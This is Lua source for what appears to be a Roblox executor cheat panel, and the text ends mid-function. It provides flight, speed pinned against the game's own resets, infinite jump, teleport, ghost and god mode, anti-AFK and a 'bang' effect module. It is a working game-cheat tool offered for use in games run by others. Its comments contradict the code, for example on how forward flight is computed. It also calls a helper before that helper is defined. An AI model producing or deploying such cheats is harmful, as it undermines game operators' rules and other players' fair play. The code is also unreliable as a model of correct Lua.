		{ "Left Shoulder", -1.25, 0, 0.30 },
		{ "RightElbow", 0, 0, -0.12 },
		{ "LeftElbow", 0, 0, 0.12 },
		{ "RightHip", 0.10, 0, -0.06 },
		{ "LeftHip", 0.10, 0, 0.06 },
		{ "Right Hip", 0.10, 0, -0.06 },
		{ "Left Hip", 0.10, 0, 0.06 },
	}

	local function poseEnabled()
		return (ctx.Config and ctx.Config.FlyPose) ~= false
	end

	local function poseCapture()
		local c = char()
		if not c then return false end
		local motors = {}
		local ok = pcall(function()
			for _, d in ipairs(c:GetDescendants()) do
				if d:IsA("Motor6D") or d.ClassName == "Motor6D" then
					motors[#motors + 1] = d
				end
			end
		end)
		if not ok or #motors == 0 then return false end

		local saved = {}
		for _, m in ipairs(motors) do
			saved[#saved + 1] = { motor = m, base = m.C0 }
		end

		-- [[ pause the game's own animation script: it replays the fall pose on
		-- top of ours every time the humanoid state changes ]] --
		local animate = nil
		pcall(function() animate = c:FindFirstChild("Animate") end)
		local wasDisabled = nil
		if animate then
			pcall(function()
				wasDisabled = animate.Disabled
				animate.Disabled = true
			end)
		end

		-- stop whatever is playing right now, otherwise the last fall frame sticks
		local h = hum()
		if h then
			pcall(function()
				for _, track in ipairs(h:GetPlayingAnimationTracks()) do
					pcall(function() track:Stop(0.1) end)
				end
			end)
		end

		s.pose = { saved = saved, animate = animate, wasDisabled = wasDisabled }
		s.poseBlend = 0
		return true
	end

	-- called every frame by the fly loop: blend in over ~0.18s so the rig does not
	-- snap from standing to flying in one frame
	local function poseApply(dt)
		local p = s.pose
		if not p then return end
		local target = 1
		local blend = s.poseBlend or 0
		blend = blend + (target - blend) * math.min(1, (dt or 0.016) * 9)
		s.poseBlend = blend
		if type(CFrame.Angles) ~= "function" then return end

		local want = {}
		for _, row in ipairs(POSE) do want[row[1]] = row end

		for _, entry in ipairs(p.saved) do
			local m = entry.motor
			if m and m.Parent then
				local name
				pcall(function() name = m.Name end)
				local row = name and want[name]
				if row then
					pcall(function()
						m.C0 = entry.base * CFrame.Angles(
							row[2] * blend, row[3] * blend, row[4] * blend)
					end)
				end
			end
		end
	end

	local function poseRelease()
		local p = s.pose
		s.pose = nil
		s.poseBlend = 0
		if not p then return end
		for _, entry in ipairs(p.saved) do
			if entry.motor and entry.motor.Parent and entry.base then
				pcall(function() entry.motor.C0 = entry.base end)
			end
		end
		if p.animate then
			pcall(function() p.animate.Disabled = p.wasDisabled or false end)
		end
	end

	M.poseCapture = poseCapture
	M.poseRelease = poseRelease
	M.isFlying = function() return s.fly == true end
	-- read-only introspection, used by the tests (and handy in a console)
	M.poseInfo = function()
		return { joints = (s.pose and #s.pose.saved) or 0, blend = s.poseBlend or 0 }
	end
	M.godHookState = function() return s.godHooks end

	function M.fly(on, speed)
		M.unfly()
		if not on then return true end
		local r, h = root(), hum()
		if not r or not h then return false, "no character" end
		pcall(function()
			if r.Anchored then r.Anchored = false end
		end)
		if r.Anchored then return false, "your character is anchored here" end

		s.fly = true
		s.flySpeed = speed or 60
		s.orig.platformStand = h.PlatformStand
		pcall(function() h.PlatformStand = true end)

		local function down(kc)
			local ok, res = pcall(function() return ctx.UserInput:IsKeyDown(kc) end)
			return ok and res
		end

		--[[
		  FLIGHT CONTROLS

		  What made this feel awful before:
		  - it read Humanoid.MoveDirection only. Under PlatformStand that vector is
		    whatever the humanoid last computed, so input could lag a frame or drop
		    out entirely, and on touch it is one frame behind the thumbstick.
		  - one fixed lerp (0.35 per frame) meant the same sluggishness accelerating
		    and stopping: releasing W left you drifting, because 0.35 per frame is a
		    ~0.25s glide at 60fps and worse on a slow frame.
		  - altitude was camera pitch plus keys, so looking down sank you *and*
		    modified forward speed at the same time.

		  Now:
		  - the keys are read directly (W/A/S/D), so control is immediate and does
		    not depend on the humanoid state machine; the humanoid's own move
		    direction is only the fallback, which is what keeps touch thumbsticks
		    and gamepads working.
		  - forward is the camera's full look vector, so looking up and holding W
		    climbs a slope instead of needing Space, and looking down dives.
		  - vertical is Space / LeftControl (LeftShift too), world Y, independent of
		    where you are looking.
		  - velocity eases in at 7/s and brakes at 18/s, so a release stops you in
		    about a tenth of a second instead of gliding on. No keys at all means
		    target zero: it hovers where you leave it.
		  - dt is the real frame delta, clamped, so a 30fps machine behaves like a
		    60fps one instead of flying at half speed.
		]]
		s.flyConn = track(RunService.RenderStepped:Connect(function(dtArg)
			if not s.fly then return end
			local rr, hh = root(), hum()
			local cam = Workspace.CurrentCamera
			if not rr or not hh or not cam then return end

			local dt = tonumber(dtArg) or 1 / 60
			if dt <= 0 then dt = 1 / 60 end
			dt = math.clamp(dt, 1 / 240, 0.1)

			local look = cam.CFrame.LookVector
			local right = cam.CFrame.RightVector
			local touchOnly = false
			pcall(function()
				touchOnly = ctx.UserInput and ctx.UserInput.TouchEnabled == true
			end)

			local mx = 0
			if down(Enum.KeyCode.D) then mx += 1 end
			if down(Enum.KeyCode.A) then mx -= 1 end
			local mz = 0
			if down(Enum.KeyCode.W) then mz += 1 end
			if down(Enum.KeyCode.S) then mz -= 1 end

			--[[
			  FLAT FORWARD, NOT THE CAMERA LOOK VECTOR.

			  The previous version used the full look vector, so holding W while
			  looking at the floor drove you into it at full speed and looking up
			  made W climb - which is why it felt like fighting the camera. Forward
			  is now the camera direction with Y removed: W always means "where I am
			  facing, horizontally". Altitude is its own control. This is what every
			  flight implementation in Roblox does, and for good reason.
			]]
			local flatLook = Vector3.new(look.X, 0, look.Z)
			if flatLook.Magnitude < 0.01 then
				-- looking straight down or up: fall back to the head's facing so
				-- W does not suddenly do nothing at the vertical extremes
				local head = rr.CFrame.LookVector
				flatLook = Vector3.new(head.X, 0, head.Z)
			end
			if flatLook.Magnitude > 0.01 then flatLook = flatLook.Unit end
			local flatRight = Vector3.new(right.X, 0, right.Z)
			if flatRight.Magnitude > 0.01 then flatRight = flatRight.Unit end

			local dir = Vector3.zero
			if mx ~= 0 or mz ~= 0 then
				dir = flatLook * mz + flatRight * mx
				if dir.Magnitude > 0.001 then dir = dir.Unit end
			else
				-- touch / gamepad: the humanoid's own move direction, flattened so
				-- a thumbstick tilt cannot turn into unexpected climbing
				local md = hh.MoveDirection or Vector3.zero
				md = Vector3.new(md.X, 0, md.Z)
				if md.Magnitude > 0.05 then dir = md.Unit end
			end

			local up = 0
			if down(Enum.KeyCode.Space) then up += 1 end
			if down(Enum.KeyCode.LeftControl) or down(Enum.KeyCode.LeftShift) then up -= 1 end
			if down(Enum.KeyCode.E) then up += 1 end
			if down(Enum.KeyCode.Q) then up -= 1 end

			local speed = s.flySpeed or 60

			--[[
			  VELOCITY, NOT POSITION.

			  Writing CFrame each frame looks smooth in an empty baseplate and feels
			  awful everywhere else: it ignores collision (you pass through walls),
			  it desyncs from the server so other players see you stutter, and it
			  kills any game physics you fly into. Velocity is replicated properly and
			  collides.

			  The humanoid is what fights it: under PlatformStand it still applies
			  its own controller forces. Setting MoveDirection to zero and keeping
			  PlatformStand on stops that, so our velocity is the only thing acting.
			]]
			pcall(function() hh.MoveDirection = Vector3.zero end)

			local target = dir * speed + Vector3.new(0, up * speed, 0)
			if target.Magnitude > speed then
				target = target.Unit * speed -- diagonal was faster than straight
			end

			local cur = rr.AssemblyLinearVelocity or Vector3.zero
			--[[
			  Acceleration is time-constant based, not per-frame: 8/s settle means
			  ~0.12s to reach speed, and braking at 20/s means a release stops you in
			  ~0.05s. Using dt (not a raw per-frame factor) is what makes this feel
			  the same on a 30fps phone and a 240fps desktop instead of sluggish on
			  one and twitchy on the other.
			]]
			local moving = (dir.Magnitude > 0.01 or up ~= 0)
			local k = 1 - math.exp(-(moving and 8 or 20) * dt)
			local v = cur + (target - cur) * k
			if v.Magnitude < 0.08 then v = Vector3.zero end
			pcall(function()
				rr.AssemblyLinearVelocity = v
				rr.AssemblyAngularVelocity = Vector3.zero
			end)

			-- the pose is opt-in now (Config.FlyPose defaults false), so it only runs
			-- when you asked for it
			if s.pose then pcall(poseApply, dt) end
		end))

		if poseEnabled() then pcall(poseCapture) end

		-- the animation half of fly: trail, thrusters, aura, camera bank and an
		-- FOV punch, all client-side pictures in lib/fx.lua
		if ctx.FX then pcall(function() ctx.FX.flyStart() end) end
		return true
	end

	function M.unfly()
		if not s.fly and not s.flyConn then return end
		s.fly = false
		pcall(poseRelease)
		if ctx.FX then pcall(function() ctx.FX.flyStop() end) end
		if s.flyConn then
			pcall(function() s.flyConn:Disconnect() end)
			s.flyConn = nil
		end
		local h = hum()
		if h and s.orig.platformStand ~= nil then
			pcall(function() h.PlatformStand = s.orig.platformStand end)
			s.orig.platformStand = nil
		end
		local r = root()
		if r then pcall(function() r.AssemblyLinearVelocity = Vector3.zero end) end
	end

	function M.setSpeed(n)
		local h = hum()
		if not h then return false end
		s.orig.walkSpeed = s.orig.walkSpeed or h.WalkSpeed
		h.WalkSpeed = n
		return true
	end

	--[[
	  Fix a stuck character. Every exploit that moves your body can leave you
	  spun, anchored in mid-air, seated, or with the camera following something
	  else - which is what "my screen is stuck on one spot" feels like. This
	  clears all of it and re-points the camera at your own humanoid.
	]]
	function M.resetPhysics()
		local c = char()
		if not c then return false, "no character" end
		local h = hum()
		local r = root()
		-- An anchor is the usual cause of 'stuck in mid-air', and zeroing velocity
		-- does nothing to it. Clear it first, or the whole reset is a no-op.
		local wasAnchored = false
		if r and r.Anchored then
			wasAnchored = true
			pcall(function() r.Anchored = false end)
		end
		for _, d in ipairs(c:GetDescendants()) do
			if d:IsA("BasePart") then
				if d.Anchored and d ~= r then pcall(function() d.Anchored = false end) end
				pcall(function() d.AssemblyLinearVelocity = Vector3.new(0, 0, 0) end)
				pcall(function() d.AssemblyAngularVelocity = Vector3.new(0, 0, 0) end)
			end
		end
		-- leave no weld holding us to anything (the caller does this too, but an
		-- API caller of Self.resetPhysics() alone used to stay welded)
		for _, d in ipairs(c:GetDescendants()) do
			if d:IsA("Weld") or d:IsA("WeldConstraint") or d:IsA("Motor6D") then
				local p0, p1 = d.Part0, d.Part1
				if p1 == r or p0 == r then
					-- Motor6D joints are the rig itself; only drop welds we or a
					-- seat added, never the character's own motors
					if not d:IsA("Motor6D") or d.Name == "FB_WeldFling" or d.Name == "SeatWeld" then
						pcall(function() d:Destroy() end)
					end
				end
			end
		end
		if h then
			pcall(function() h.PlatformStand = false end)
			pcall(function() h.Sit = false end)
			pcall(function() h.AutoRotate = true end)
			pcall(function() h:ChangeState(Enum.HumanoidStateType.GettingUp) end)
			local cam = Workspace.CurrentCamera
			if cam then pcall(function() cam.CameraSubject = h end) end
		end
		return true, wasAnchored and "unanchored" or nil
	end

	--[[
	  God speed. Games reset WalkSpeed constantly, so a one-shot write is
	  usually undone within a frame. This pins it from Heartbeat instead, which
	  wins against ordinary resets.
	]]
	function M.godSpeed(on, speed)
		s.godSpeed = on and true or false
		if not on then
			s.godSpeed = false
			local h = hum()
			if h and s.orig.walkSpeed then pcall(function() h.WalkSpeed = s.orig.walkSpeed end) end
			return true
		end
		s.godSpeedValue = speed or 500
		if not s.godSpeedConn then
			s.godSpeedConn = track(RunService.Heartbeat:Connect(function()
				if not s.godSpeed then return end
				local h = hum()
				if not h then return end
				local want = s.godSpeedValue or 500
				if h.WalkSpeed ~= want then h.WalkSpeed = want end
			end))
		end
		local h = hum()
		if h then
			s.orig.walkSpeed = s.orig.walkSpeed or h.WalkSpeed
			h.WalkSpeed = s.godSpeedValue
		end
		return true
	end

	function M.isGodSpeed() return s.godSpeed == true end

	function M.setJump(n)
		local h = hum()
		if not h then return false end
		s.orig.jumpPower = s.orig.jumpPower or h.JumpPower
		pcall(function() h.UseJumpPower = true end)
		h.JumpPower = n
		return true
	end

	----------------------------------------------------------------- invisible
	--[[
	  Invisible.

	  Measured in Studio, and the honest result: writing Transparency on your own
	  character from the client does NOT replicate. The client set Head.Transparency
	  = 1 and the server still read 0, so other players keep seeing you. Property
	  changes made locally are not sent to the server; only physics ownership
	  (CFrame of your own root) travels that way.

	  There is no client-side route to being invisible to everyone - that needs the
	  server to cooperate, which is out of reach of any script running here. What
	  this does is hide you from your own camera, which is still useful for
	  screenshots and for seeing through your own body. It is labelled that way in
	  the UI so nobody is told it does more than it does.

	  It does record each part's original transparency, so restoring is exact and
	  does not flatten a deliberately semi-transparent part. Accessories added
	  while hidden are caught by DescendantAdded.
	]]
	function M.invisible(on)
		s.invisible = on and true or false
		local c = char()
		if not c then return false, "no character" end

		local function apply(inst)
			if inst:IsA("BasePart") then
				if s.invOrig[inst] == nil then s.invOrig[inst] = inst.Transparency end
				pcall(function() inst.Transparency = 1 end)
			elseif inst:IsA("Decal") or inst:IsA("Texture") then
				if s.invOrig[inst] == nil then s.invOrig[inst] = inst.Transparency end
				pcall(function() inst.Transparency = 1 end)
			elseif inst:IsA("BillboardGui") then
				pcall(function() inst.Enabled = false end)
			end
		end

		if not on then
			for inst, t in pairs(s.invOrig) do
				pcall(function() inst.Transparency = t end)
			end
			table.clear(s.invOrig)
			if s.invConn then
				pcall(function() s.invConn:Disconnect() end)
				s.invConn = nil
			end
			-- re-enable name tags we turned off
			for _, d in ipairs(c:GetDescendants()) do
				if d:IsA("BillboardGui") then pcall(function() d.Enabled = true end) end
			end
			return true
		end

		for _, d in ipairs(c:GetDescendants()) do apply(d) end
		if s.invConn then pcall(function() s.invConn:Disconnect() end) end
		s.invConn = track(c.DescendantAdded:Connect(function(d)
			if s.invisible then apply(d) end
		end))
		return true
	end

	function M.isInvisible() return s.invisible == true end

	function M.ghost(on)
		s.ghost = on and true or false
		local c = char()
		if not c then return false, "no character" end

		if not on then
			for _, d in ipairs(c:GetDescendants()) do
				if d:IsA("BasePart") then
					-- restore the EXACT originals: this used to hard-code CanTouch =
					-- true and Transparency = 0, which silently overrode a part that
					-- was authored semi-transparent, or that `invisible` had already
					-- hidden, or a hitbox that was intentionally non-touchable
					local o = s.ghostOrig[d]
					--[[
					  Restore the EXACT originals. This used to hard-code CanTouch =
					  true and Transparency = 0, which overrode a part authored
					  semi-transparent, or one `invisible` had already hidden, or a hitbox
					  that was intentionally non-touchable.

					  Do NOT write this as `(o and o.canTouch ~= nil) and o.canTouch or true`.
					  A stored `false` falls through the trailing `or` and restores as true -
					  the exact bug this comment replaces. It needs a real branch, because
					  `false` is indistinguishable from 'missing' to `and`/`or`.
					]]
					local ct = true
					local tr = 0
					if o then
						if o.canTouch ~= nil then ct = o.canTouch end
						if o.transparency ~= nil then tr = o.transparency end
					end
					pcall(function() d.CanTouch = ct end)
					pcall(function() d.Transparency = tr end)
				elseif d:IsA("Decal") or d:IsA("Texture") then
					local o = s.ghostOrig[d]
					local tr = 0
					if o and o.transparency ~= nil then tr = o.transparency end
					pcall(function() d.Transparency = tr end)
				elseif d:IsA("ForceField") and d.Name == "FB_God" then
					pcall(function() d:Destroy() end)
				end
			end
			table.clear(s.ghostOrig)
			if s.ghostConn then
				pcall(function() s.ghostConn:Disconnect() end)
				s.ghostConn = nil
			end
			M.godMode(false, true)
			-- if `invisible` is still on, re-apply it instead of leaving the
			-- character visible because ghost just wrote 0 everywhere
			if s.invisible then M.invisible(true) end
			return true
		end

		local function applyPart(d)
			if d:IsA("BasePart") then
				if s.ghostOrig[d] == nil then
					s.ghostOrig[d] = { canTouch = d.CanTouch, transparency = d.Transparency }
				end
				pcall(function() d.CanTouch = false end)
				pcall(function() d.Transparency = 1 end)
			elseif d:IsA("Decal") or d:IsA("Texture") then
				if s.ghostOrig[d] == nil then s.ghostOrig[d] = { transparency = d.Transparency } end
				pcall(function() d.Transparency = 1 end)
			end
		end

		for _, d in ipairs(c:GetDescendants()) do applyPart(d) end
		if not c:FindFirstChild("FB_God") then
			local ff = Instance.new("ForceField")
			ff.Name = "FB_God"
			ff.Visible = false
			ff.Parent = c
		end
		M.godMode(true, true)

		-- parts added later (tools, accessories) must not reopen the hitbox
		if s.ghostConn then pcall(function() s.ghostConn:Disconnect() end) end
		s.ghostConn = track(c.DescendantAdded:Connect(function(d)
			if not s.ghost then return end
			applyPart(d)
		end))
		return true
	end

	function M.isGhost() return s.ghost == true end

	----------------------------------------------------------------- teleporting
	-- click-to-teleport: reads the mouse hit once, so it works the same on PC
	-- and on touch (a tap sets Mouse.Hit)
	function M.teleportToCursor(offset)
		local r = root()
		if not r then return false, "no character" end
		local mouse = LP:GetMouse()
		local hit = mouse and mouse.Hit
		if not hit then return false, "no cursor position" end
		local target = hit.Position + Vector3.new(0, offset or 3, 0)
		r.CFrame = CFrame.new(target) * (r.CFrame - r.CFrame.Position)
		local h = hum()
		if h then pcall(function() h.PlatformStand = false end) end
		return true, target
	end

	function M.savePosition()
		local r = root()
		if not r then return false, "no character" end
		s.savedPos = r.CFrame
		return true
	end

	function M.loadPosition()
		if not s.savedPos then return false, "nothing saved yet" end
		local r = root()
		if not r then return false, "no character" end
		r.CFrame = s.savedPos
		return true
	end

	function M.hasSavedPosition() return s.savedPos ~= nil end

	----------------------------------------------------------------- infinite jump
	-- re-enters the jump state whenever the humanoid falls, which is what makes
	-- multi-jump work without touching JumpPower
	function M.infiniteJump(on)
		s.infJump = on and true or false
		if s.infJumpConn then
			pcall(function() s.infJumpConn:Disconnect() end)
			s.infJumpConn = nil
		end
		if not on then return true end
		s.infJumpConn = track(RunService.RenderStepped:Connect(function()
			if not s.infJump then return end
			local h = hum()
			if not h then return end
			local ok, state = pcall(function() return h:GetState() end)
			if ok and state == Enum.HumanoidStateType.Freefall then
				pcall(function() h:ChangeState(Enum.HumanoidStateType.Jumping) end)
			end
		end))
		return true
	end

	------------------------------------------------------------------- perf readout
	-- Client-side only. This is what tells you whether lag is your frame rate or
	-- the network - it measures nothing on the server and sends no load.
	function M.perf()
		local fps = s.fps or 0
		local ping = 0
		local okPing, v = pcall(function()
			return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
		end)
		if okPing and type(v) == "number" then ping = math.floor(v) end
		local parts = 0
		pcall(function()
			for _, d in ipairs(workspace:GetDescendants()) do
				if d:IsA("BasePart") then parts += 1 end
			end
		end)
		return { fps = math.floor(fps), ping = ping, parts = parts }
	end

	function M.startPerf()
		if s.perfConn then return end
		local frames, t0 = 0, os.clock()
		-- trackLive, not track: 'restore everything' used to untrackAll() this and
		-- leave fps frozen at its last reading for the rest of the session
		s.perfConn = trackLive(RunService.RenderStepped:Connect(function()
			frames += 1
			local now = os.clock()
			if now - t0 >= 1 then
				s.fps = frames / (now - t0)
				frames, t0 = 0, now
			end
		end))
	end

	function M.stopPerf()
		if s.perfConn then
			pcall(function() s.perfConn:Disconnect() end)
			s.perfConn = nil
		end
	end

	------------------------------------------------------------------- anti afk
	--[[
	  This was completely dead. It read ctx.VirtualUser, which the ctx table never
	  contains (ui.lua builds it with Players/RunService/UserInput/Workspace/LP/
	  Config/notify/out only), so every call threw 'attempt to index nil' inside a
	  pcall and the toggle flipped on while doing nothing at all, forever.
	  VirtualUser is a genuine service: fetch it from game.
	]]
	local function virtualUser()
		if s.vu ~= nil then return s.vu end
		local ok, vu = pcall(function() return game:GetService("VirtualUser") end)
		s.vu = (ok and vu) or false
		return s.vu
	end

	function M.antiAfk(on)
		if not on then
			if s.afkConn then
				pcall(function() s.afkConn:Disconnect() end)
				s.afkConn = nil
			end
			return true
		end
		local vu = virtualUser()
		if not vu then return false, "this executor has no VirtualUser service" end
		if s.afkConn then pcall(function() s.afkConn:Disconnect() end) end
		-- the readiness timer is 20 minutes, so once a minute is plenty
		s.afkConn = trackLive(RunService.Heartbeat:Connect(function()
			if s.afkCd and os.clock() - s.afkCd < 60 then return end
			s.afkCd = os.clock()
			pcall(function() vu:CaptureController() end)
		end))
		return true
	end

	---------------------------------------------------------------- local freeze
	-- Honestly named: this stops YOUR physics, it is not a server-wide freeze.
	function M.freezeLocal(on)
		local r = root()
		if not r then return false, "no character" end
		s.frozen = on and true or false
		pcall(function() r.Anchored = s.frozen end)
		return true
	end

	function M.isFrozen() return s.frozen end

	-- A respawn builds a brand new character. Re-apply the persistent toggles and
	-- make sure a bang that was cut short (kick, reset, death) does not leave the
	-- fresh rig with collisions off and the engine still holding a dead root.
	--
	-- NOTE: the snapshots must NOT be cleared here. This is called from a queued
	-- task.delay(0.6) on CharacterAdded, so it can run *after* ghost/invisible have
	-- already been switched on - clearing them threw away the only record of the
	-- real per-part values and made ghost(false) restore the hard-coded defaults.
	-- Stale keys for parts of the previous character are harmless: every restore
	-- path guards on `p.Parent`.
	function M.onCharacterAdded()
		local c = char()
		if c and not s.noclip then
			local r = c:FindFirstChild("HumanoidRootPart")
			if r then
				pcall(function() r.CanCollide = true end)
				if r.AssemblyLinearVelocity.Magnitude > 500 then
					pcall(function() r.AssemblyLinearVelocity = Vector3.zero end)
				end
			end
		end
		if s.fly then
			-- a respawn builds new joints, so the old pose snapshot is worthless
			s.pose = nil
			s.poseBlend = 0
			if poseEnabled() then pcall(poseCapture) end
		end
		if s.ghost then
			M.ghost(true)
		end
		if s.god then
			-- implied, so a respawn while ghost is on does not claim the god toggle
			M.godMode(true, true)
		end
	end

	function M.restoreAll()
		untrackAll()
		M.ghost(false)
		M.invisible(false)
		M.infiniteJump(false)
		M.godSpeed(false)
		if s.godSpeedConn then pcall(function() s.godSpeedConn:Disconnect() end) s.godSpeedConn = nil end
		M.unfly()
		M.unnoclip()
		M.stopAntiVoid()
		M.godMode(false)
		M.freezeLocal(false)
		local h = hum()
		if h then
			if s.orig.walkSpeed then pcall(function() h.WalkSpeed = s.orig.walkSpeed end) end
			if s.orig.jumpPower then pcall(function() h.JumpPower = s.orig.jumpPower end) end
			local mh = s.orig.maxHealth
			if mh and mh ~= math.huge then pcall(function() h.MaxHealth = mh end) end
		end
		return true
	end

	return M
end

		return Self
	end)()

	local FXLib = (function()
--[[
  fx.lua - visual-only effects

  Everything in this file is a picture on YOUR screen. It never writes a CFrame,
  a velocity, a weld or a Humanoid to another player (or to you). That is the
  point: in a game where characters do not collide, a "bang" cannot launch
  anybody - the old velocity ram just left your own body parked and looking
  frozen. A bang here is a flash, a shockwave, a BANG!! label, a sound and a
  little camera kick, and nothing else.

  ZERO DELAY, HONESTLY
  - The first burst is spawned synchronously inside Bang(), before the function
    returns, so it exists on the very frame you press the button.
  - Nothing on the fire path calls task.wait / task.delay. Ages are driven by one
    RenderStepped loop that already exists for the picture, not by timers.
  - The marker and the pulses read the target's Head every frame, so the effect
    sits on them with no interpolation lag.
  What no client script can do is make somebody else's screen show it: property
  writes and instances created on a client are not replicated. Their screen is
  only affected by things the server replicates, which is out of reach here.
]]

local FX = {}

function FX.new(ctx)
	local Workspace, RunService = ctx.Workspace, ctx.RunService
	local Config = ctx.Config or {}
	local out = ctx.out or function() end

	local M = {}

	local state = {
		folder = nil,
		live = {},        -- aged effect records
		target = nil,
		active = false,   -- bang picture is running
		nextPulse = 0,
		hits = 0,
		shake = 0,
		highlight = nil,
		marker = nil,
		label = nil,      -- persistent BANG!! gui, reused for every pulse
		snd = nil,        -- persistent Sound, replayed instead of recreated
		labelT0 = 0,
		fly = false,
		flyFx = {},       -- trail / attachments / emitters we created
		baseFov = nil,
		roll = 0,
		last = nil,
		conn = nil,
	}

	-- the number sequences and enums below are all real Roblox API, but every
	-- construction is guarded: an executor on an old client should degrade to a
	-- missing flourish, never to an error that kills the panel
	local function safe(fn, ...)
		local ok, res = pcall(fn, ...)
		if ok then return res end
		-- a missing flourish must never take the panel down, but it should be
		-- diagnosable instead of vanishing into a silent pcall
		state.errs = (state.errs or 0) + 1
		state.lastError = tostring(res)
		return nil
	end

	local function folder()
		if state.folder and state.folder.Parent then return state.folder end
		local f = safe(function() return Instance.new("Folder") end)
		if not f then return nil end
		f.Name = "FB_FX"
		f.Parent = Workspace
		state.folder = f
		return f
	end

	--------------------------------------------------------------------- ageing
	-- one list, one clock. Records outlive nothing: every node is destroyed when
	-- its effect ends, and clear() destroys the whole folder as a backstop.
	-- group lets stopBang drop exactly the bang picture and leave a fly trail
	-- alone (and the other way round) instead of guessing from node names
	local function spawn(node, ttl, tick, group, recycle)
		if not node then return end
		state.live[#state.live + 1] = {
			node = node,
			t0 = os.clock(),
			ttl = ttl,
			tick = tick,
			group = group or "fx",
			recycle = recycle == true,
		}
	end

	local function ageEffects(now)
		for i = #state.live, 1, -1 do
			local e = state.live[i]
			local age = now - e.t0
			local gone = age >= e.ttl or not e.node.Parent
			if gone then
				if e.recycle then
					givePooled(e.node)
				elseif e.node.Parent then
					pcall(function() e.node:Destroy() end)
				end
				table.remove(state.live, i)
			elseif e.tick then
				pcall(e.tick, age / e.ttl, age)
			end
		end
	end

	--------------------------------------------------------------------- helpers
	--[[
	  A small recycle bin for the plain shapes (core, ring, fly shockwave). Those
	  are the only effects that exist in the tens during a fast pulse, and they are
	  identical every time, so recreating them was pure garbage. Nodes with children
	  we built by hand (spark emitter, label, sound) are never pooled.
	]]
	local pool = {}

	local function givePooled(part)
		if not part then return end
		if #pool >= 40 or next(part:GetChildren()) ~= nil then
			pcall(function() part:Destroy() end)
			return
		end
		pcall(function() part.Parent = nil end)
		pool[#pool + 1] = part
	end

	local function takePooled()
		local part = table.remove(pool)
		if part and not part.Parent then return part end
		return nil
	end

	local function newPart(pos)
		local part = takePooled() or safe(function() return Instance.new("Part") end)
		if not part then return nil end
		part.Name = "FB_Fx"
		part.Shape = Enum.PartType.Block
		part.Anchored = true
		part.CanCollide = false
		part.CanQuery = false
		part.CanTouch = false
		part.CastShadow = false
		part.Material = Enum.Material.Neon
		part.TopSurface = Enum.SurfaceType.Smooth
		part.BottomSurface = Enum.SurfaceType.Smooth
		part.Size = Vector3.new(0.6, 0.6, 0.6)
		part.CFrame = CFrame.new(pos)
		part.Transparency = 0
		part.Parent = folder()
		return part
	end

	local function seq(pairsList)
		local keys = {}
		for _, p in ipairs(pairsList) do
			keys[#keys + 1] = NumberSequenceKeypoint.new(p[1], p[2])
		end
		return NumberSequence.new(keys)
	end

	local function range(a, b)
		return NumberRange.new(a, b)
	end

	local PALETTE = {
		nova = { hot = Color3.fromRGB(255, 255, 255), glow = Color3.fromRGB(167, 112, 255) },
		shockwave = { hot = Color3.fromRGB(255, 255, 255), glow = Color3.fromRGB(64, 220, 255) },
		glitch = { hot = Color3.fromRGB(255, 240, 250), glow = Color3.fromRGB(255, 60, 140) },
		flame = { hot = Color3.fromRGB(255, 246, 200), glow = Color3.fromRGB(255, 110, 30) },
	}

	local SOUND = {
		nova = "rbxasset://sounds/snap.mp3",
		shockwave = "rbxasset://sounds/impact_generic.mp3",
		glitch = "rbxasset://sounds/electronic_ping.wav",
		flame = "rbxasset://sounds/bass.wav",
	}

	local DOTS = "^,-~*"

	------------------------------------------------------------------ effects
	-- the blast itself: a bright core that swells and fades, a flat ring that
	-- races outward, and a spark burst. All of it reads instantly at any distance
	-- because the core is Neon and the ring is scaled flat toward the camera.
	local function blast(pos, style, scale, count)
		local pal = PALETTE[style] or PALETTE.nova
		--[[
		  Hard cap. At the fastest pulse (0.06s) with the biggest size this loop
		  would otherwise keep ~100 parts alive at once, which is where a "the
		  effect lags me" report comes from. The core always fires - that is the
		  hit - and the ring and sparks are what get skipped under pressure.
		]]
		local heavy = #state.live < (Config.FXLimit or 90)
		local host = newPart(pos)
		if not host then return end

		-- core
		host.Shape = Enum.PartType.Ball
		host.Size = Vector3.new(0.5, 0.5, 0.5) * scale
		host.Color = pal.hot
		host.Transparency = 0.05
		spawn(host, 0.30, function(t)
			local s = (0.5 + t * 5.0) * scale
			host.Size = Vector3.new(s, s, s)
			host.Transparency = t * 0.95
		end, "bang", true)

		-- ring: a second ball squashed flat, expanding much further
		local ring = heavy and newPart(pos) or nil
		if ring then
			ring.Shape = Enum.PartType.Ball
			ring.Color = pal.glow
			ring.Transparency = 0.25
			ring.Size = Vector3.new(1, 0.15, 1) * scale
			spawn(ring, 0.42, function(t)
				local s = (1 + t * 16) * scale
				ring.Size = Vector3.new(s, math.max(0.08, 0.15 * scale * (1 - t)), s)
				ring.Transparency = 0.2 + t * 0.8
				ring.CFrame = CFrame.new(pos) * CFrame.Angles(0, t * 5, 0)
			end, "bang", true)
		end

		-- sparks
		local emitterHost = heavy and newPart(pos) or nil
		if emitterHost then
			emitterHost.Transparency = 1
			emitterHost.Size = Vector3.new(0.2, 0.2, 0.2)
			safe(function()
				local em = Instance.new("ParticleEmitter")
				em.Name = "FB_Sparks"
				em.Texture = "rbxasset://textures/particles/sparkles_main.dds"
				em.Color = ColorSequence.new(pal.hot, pal.glow)
				em.Size = seq({ { 0, 0.55 * scale }, { 0.4, 0.3 * scale }, { 1, 0 } })
				em.Transparency = seq({ { 0, 0 }, { 0.7, 0.2 }, { 1, 1 } })
				em.Lifetime = range(0.25, 0.65)
				em.Speed = range(16 * scale, 42 * scale)
				em.SpreadAngle = Vector2.new(180, 180)
				em.Rate = 0
				em.RotSpeed = range(-220, 220)
				em.LightEmission = 1
				em.LightInfluence = 0
				em.Drag = 2.5
				em.Acceleration = Vector3.new(0, -18, 0)
				em.Parent = emitterHost
				em:Emit(math.floor(count or 26))
			end)
			spawn(emitterHost, 1.1, nil, "bang")
		end

		return host
	end

	--[[
	  The BANG!! label and the impact sound are built ONCE per bang and reused on
	  every pulse. Building a BillboardGui with two TextLabels and a fresh Sound
	  for each hit was the single most expensive thing in a fast loop: at the 0.06s
	  pulse that is ~33 guis and ~33 Sound instances a second, all thrown away.
	]]
	local function makeLabel()
		local host = newPart(Vector3.new(0, 0, 0))
		if not host then return nil end
		host.Transparency = 1
		host.Size = Vector3.new(0.2, 0.2, 0.2)
		host.CanQuery = false
		local built = safe(function()
			local gui = Instance.new("BillboardGui")
			gui.Name = "FB_BangLabel"
			gui.Size = UDim2.fromOffset(220, 96)
			gui.StudsOffset = Vector3.new(0, 1.4, 0)
			gui.AlwaysOnTop = true
